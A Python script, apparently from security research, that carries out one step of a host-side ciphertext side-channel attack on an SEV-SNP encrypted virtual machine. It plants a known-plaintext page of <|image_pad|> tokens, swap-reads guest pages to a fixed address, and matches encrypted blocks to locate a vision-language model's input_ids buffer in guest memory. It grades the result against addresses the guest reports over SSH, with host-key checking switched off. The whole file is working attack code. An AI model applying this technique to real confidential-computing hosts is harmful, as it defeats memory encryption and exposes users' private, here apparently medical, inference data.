#!/usr/bin/env python3
"""
llm_imagepad_scan.py — Step (B) core: locate the input_ids buffer inside a
candidate 2MB block purely host-side, via the <|image_pad|> ciphertext
fingerprint. No guest-reported GPA.

Mechanism (same shape as mnist_dict_build.py --scan-block):
  FIXED_GPA         : fresh zero page (ICMP-planted, known plaintext).
  IMAGE_PAD ref page: fresh page fully filled with the <|image_pad|> token
                      (id 151655) as repeated int64 -> every 16B block is the
                      image_pad ciphertext when read at FIXED_GPA.
  For each scanned page: swap-read it to FIXED_GPA, count how many of its 256
  16B blocks equal the ref page's block at the SAME offset (SNP tweak is
  offset-dependent, so position-wise compare is required). input_ids' padding
  region is a long run of image_pad tokens -> its pages light up with a high
  match count; unrelated pages score ~0.

This validation run holds ONE known buffer (guest --gpa-only --stdin-loop),
scans a small window around it, and grades against the guest-reported GPA
(used ONLY for grading, never fed to the detector).

Usage:
  sudo python3 llm_imagepad_scan.py --index 2 --window 8
"""
import argparse
import re
import subprocess
import sys
import time
from pathlib import Path

import numpy as np

MURA_DIR = Path(__file__).parent.parent / "mura" / "dict"
sys.path.insert(0, str(MURA_DIR))
from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, ensure_mtu_9000, drain_rxbuf,
    PAGE_SIZE, CHUNK_SIZE, CHUNKS_PAGE,
    SWAP_PACE_SEC, SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)

SWAP_TOOL = str(Path(__file__).parent / "swap_pages_tool")
IMAGE_PAD_TOKEN_ID = 151655            # Qwen2-VL <|image_pad|>
SCAN_TMP = Path(__file__).parent / "scan_tmp_llm"

KEY   = "/home/eun/.ssh/id_ed25519"
GUEST = "ubuntu@localhost"
GPORT = "7777"
GUEST_PY  = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_CWD = "~/medical_ml/med_vlm/scripts"
GSCRIPT   = "single_inference_indication_gpa.py"
SSH = ["ssh", "-p", GPORT, "-i", KEY, "-o", "BatchMode=yes",
       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8", GUEST]


def imagepad_chunk() -> bytes:
    """16-byte chunk = <|image_pad|> token id as int64, twice."""
    v = np.array([IMAGE_PAD_TOKEN_ID, IMAGE_PAD_TOKEN_ID], dtype="<i8")
    return v.tobytes()  # 16 bytes


def _read_at_fixed(fixed_gpa: int, src_gpa: int, tag: str) -> bytes:
    SCAN_TMP.mkdir(exist_ok=True)
    tmp = SCAN_TMP / f"ref_{tag}.out"
    do_swap_read(fixed_gpa, src_gpa, tmp, SWAP_TOOL)
    data = parse_dump(tmp)
    tmp.unlink(missing_ok=True)
    return data


def _block(b: bytes, j: int) -> bytes:
    return b[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]


def _acquire_valid_imagepad_ref(fixed_gpa: int, mask_min: int = 100,
                                tries: int = 6):
    """Return (ref_bytes, mask) where mask is the set of 16B offsets confirmed
    to hold image_pad (i.e. differ from a zero page read at the same FIXED
    offset). acquire_gpa's payload alignment is flaky and often only partially
    fills page[1], so instead of demanding a fully-image_pad reference we keep
    the BEST partial plant and trust only its confirmed offsets — plenty to
    tell input_ids' pad run (hundreds of image_pad tokens) from noise."""
    zero_gpa = acquire_gpa(None)
    zero = _read_at_fixed(fixed_gpa, zero_gpa, "zero")
    best_ref, best_mask = None, set()
    for t in range(tries):
        rg = acquire_gpa(IMAGE_PAD_TOKEN_ID, chunk_bytes=imagepad_chunk())
        cur = _read_at_fixed(fixed_gpa, rg, f"ip{t}")
        mask = {j for j in range(CHUNKS_PAGE) if _block(cur, j) != _block(zero, j)}
        print(f"[ref] plant {t}: confirmed image_pad offsets = {len(mask)}/256")
        if len(mask) > len(best_mask):
            best_ref, best_mask = cur, mask
        if len(best_mask) >= mask_min:
            # cross-check: a second plant must AGREE on the confirmed offsets
            rg2 = acquire_gpa(IMAGE_PAD_TOKEN_ID, chunk_bytes=imagepad_chunk())
            cur2 = _read_at_fixed(fixed_gpa, rg2, f"ip{t}b")
            agree = sum(1 for j in best_mask if _block(cur2, j) == _block(best_ref, j))
            print(f"[ref] cross-check on {len(best_mask)} offsets: agree={agree}")
            if agree >= 0.9 * len(best_mask):
                print(f"[ref] validated image_pad reference "
                      f"({len(best_mask)} confirmed offsets)")
                return best_ref, best_mask
        try:
            drain_rxbuf(rounds=2)
        except Exception:
            pass
        time.sleep(2)
    if len(best_mask) >= 40:
        print(f"[ref] using best partial reference ({len(best_mask)} offsets)")
        return best_ref, best_mask
    print("[ref] validation failed after retries", file=sys.stderr)
    return None, None


def scan_page(fixed_gpa: int, page_gpa: int, ref: bytes, mask: set) -> int:
    """swap-read one page at FIXED_GPA, return #confirmed-image_pad offsets
    (mask) where this page's 16B block equals the image_pad reference."""
    SCAN_TMP.mkdir(exist_ok=True)
    tmp = SCAN_TMP / f"p_{page_gpa:x}.out"
    try:
        do_swap_read(fixed_gpa, page_gpa, tmp, SWAP_TOOL)
        data = parse_dump(tmp)
    finally:
        tmp.unlink(missing_ok=True)
    return sum(1 for j in mask if _block(data, j) == _block(ref, j))


def hold_guest_buffer(index: int):
    """Start guest --gpa-only --stdin-loop, trigger index, return
    (proc, ground_truth dict). Buffer stays held until proc gets QUIT."""
    cmd = (f"cd {GUEST_CWD} && sudo {GUEST_PY} -u {GSCRIPT} "
           f"--gpa-only --calibrate --stdin-loop")
    g = subprocess.Popen(SSH + [cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, bufsize=1)
    for line in g.stdout:
        if "LOOP_READY" in line:
            break
    g.stdin.write(f"{index}\n"); g.stdin.flush()
    gt = {"base_page": None, "N": None, "tok_start": None}
    for line in g.stdout:
        m = re.search(r"input_ids base page GPA:\s+0x([0-9a-f]+)", line, re.I)
        if m: gt["base_page"] = int(m.group(1), 16)
        m = re.search(r"N_image_pad:\s+(\d+)", line)
        if m: gt["N"] = int(m.group(1))
        m = re.search(r"tok_start:\s+(\d+)", line)
        if m: gt["tok_start"] = int(m.group(1))
        if "HOLDING" in line:
            break
    return g, gt


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, default=2)
    p.add_argument("--window", type=int, default=8,
                   help="pages to scan on each side of the true base page")
    args = p.parse_args()

    ensure_mtu_9000()

    print(f"[hold] triggering guest index {args.index} (gpa-only, HOLDING)...")
    g, gt = hold_guest_buffer(args.index)
    if gt["base_page"] is None:
        print("[!] failed to hold guest buffer", file=sys.stderr)
        return
    base_page = gt["base_page"]
    print(f"[hold] GROUND TRUTH (grading only): base_page=0x{base_page:x} "
          f"N_image_pad={gt['N']} tok_start={gt['tok_start']}")

    try:
        print("[ref] acquiring fresh FIXED_GPA (zero ICMP)...")
        fixed_gpa = acquire_gpa(None)
        print(f"[ref] FIXED_GPA = 0x{fixed_gpa:x}")

        # Robust image_pad reference: acquire_gpa's payload alignment can fail
        # (landing != 0), leaving a ref page that is NOT cleanly image_pad and
        # inverts the whole scan. Validate by requiring TWO independent
        # image_pad plants to agree on >= AGREE_MIN of 256 blocks (a genuine
        # image_pad page reads identically at the same FIXED_GPA offsets), and
        # to differ from a zero page on ~all blocks. Retry until valid.
        SCAN_TMP.mkdir(exist_ok=True)
        ref, mask = _acquire_valid_imagepad_ref(fixed_gpa)
        if ref is None:
            print("[!] could not obtain a valid image_pad reference", file=sys.stderr)
            return
        print(f"[ref] scanning with {len(mask)} confirmed image_pad offsets")

        # scan window around the true base page (small, PSP-paced)
        lo = base_page - args.window * PAGE_SIZE
        print(f"\n[scan] window [{args.window} pages each side of base]  "
              f"0x{lo:x} .. 0x{base_page + args.window*PAGE_SIZE:x}")
        denom = len(mask)
        print(f"  page_gpa            off   image_pad_match/{denom}   note")
        results = []
        for k in range(-args.window, args.window + 1):
            page_gpa = base_page + k * PAGE_SIZE
            if SWAP_BURST_COOLDOWN and (k + args.window) % SWAP_BURST_COOLDOWN == 0 and k != -args.window:
                time.sleep(SWAP_BURST_SLEEP)
            else:
                time.sleep(SWAP_PACE_SEC)
            hits = scan_page(fixed_gpa, page_gpa, ref, mask)
            note = "<== TRUE base page" if page_gpa == base_page else ""
            print(f"  0x{page_gpa:x}  {k:+3d}   {hits:>4d}/{denom}   {note}")
            results.append((page_gpa, hits))

        best = max(results, key=lambda r: r[1])
        print(f"\n[result] highest image_pad page (host-derived) = 0x{best[0]:x} "
              f"({best[1]}/256 blocks)")
        print(f"[result] true base page                        = 0x{base_page:x}")
        print(f"[grade]  host-picked page within input_ids buffer: "
              f"{base_page <= best[0] <= base_page + (gt['N']//512 + 2)*PAGE_SIZE}")
    finally:
        try:
            g.stdin.write("QUIT\n"); g.stdin.flush()
            g.wait(timeout=15)
        except Exception:
            g.kill()


if __name__ == "__main__":
    main()
